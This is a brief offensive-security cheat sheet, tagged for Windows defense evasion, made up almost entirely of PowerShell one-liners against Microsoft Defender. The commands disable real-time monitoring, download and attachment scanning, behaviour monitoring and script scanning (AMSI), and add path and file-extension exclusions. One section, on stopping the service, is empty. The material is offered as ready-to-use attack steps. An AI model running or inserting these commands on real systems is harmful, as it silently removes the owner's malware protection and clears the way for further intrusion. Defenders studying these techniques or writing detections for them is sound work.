# windows
% windows, defense evasion
#plateform/windows #target/local #cat/DEFENSE-EVASION


# pwsh
% windows, defense evasion

#plateform/windows #target/local #cat/DEFENSE-EVASION #tag/powershell 

## Defender - stop service
```powershell
```

## Defender - disable All

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MPPreference -DisableBehaviourMonitoring $true; Set-MpPreference -DisableScriptScanning $true
```

## Defender - disable Real Time Monitoring 

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

## Defender - Disable scanning for downloaded or attachments

```powershell
Set-MpPreference -DisableIOAVProtection $true
```

## Defender - Disable behaviour monitoring

```powershell
Set-MPPreference -DisableBehaviourMonitoring $true
```

## Defender - Disable AMSI

```powershell
Set-MpPreference -DisableScriptScanning $true
```


## Defender - Add path to exclusions

```powershell
$p = "<path|c:\temp>" ; Add-MpPreference -ExclusionPath $p -AttackSurfaceReductionOnlyExclusions $p
```


## Defender - Add extension to exclusions

```powershell
Set-MpPreference -ExclusionExtension "<extension|ps1>"
```